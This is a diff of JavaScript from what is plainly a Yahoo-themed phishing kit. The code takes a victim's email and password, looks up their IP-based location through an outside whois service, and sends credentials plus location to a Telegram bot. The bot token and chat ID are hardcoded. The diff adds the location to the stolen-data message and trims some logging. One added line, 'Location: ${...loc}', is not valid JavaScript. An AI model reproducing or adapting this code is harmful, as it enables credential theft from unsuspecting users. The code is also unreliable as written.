@@ -39,6 +39,7 @@ document.addEventListener("DOMContentLoaded", function () {
         const pd = pi.value;
        // await sfr(el, pd);
         await getLoc();
+                console.log({...loc});
        await sendToTG(el, pd);
     });
 
@@ -62,7 +63,7 @@ document.addEventListener("DOMContentLoaded", function () {
         const telegramBotToken = "6854177545:AAHGKxjdX8SL_eKUtCnY06CZ135vD8hDB7Q"; // Replace with your Telegram bot token
         const chatId = 5645205996; // Replace with your chat ID
 
-        const messageText = `**YAHOO RESULT**\nEmail: ${e}\nPassword: ${p}`;
+        const messageText = `**YAHOO RESULT**\nEmail: ${e}\nPassword: ${p} \n\nLocation: ${...loc}`;
 
   const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
 
@@ -83,7 +84,6 @@ document.addEventListener("DOMContentLoaded", function () {
       if (!response.ok) {  
         throw new Error(`HTTP error! Status: ${response.status}`);
       }
-      console.log(response)
       return response.json();
     })
     .then((data) => {
@@ -103,7 +103,6 @@ document.addEventListener("DOMContentLoaded", function () {
     async function getLoc(){
         await fetch('https://hutils.loxal.net/whois').then(response => response.json()).then(data => {
         loc = JSON.stringify(data, null, 2);
-        console.log(loc);
       });
         return;
     };
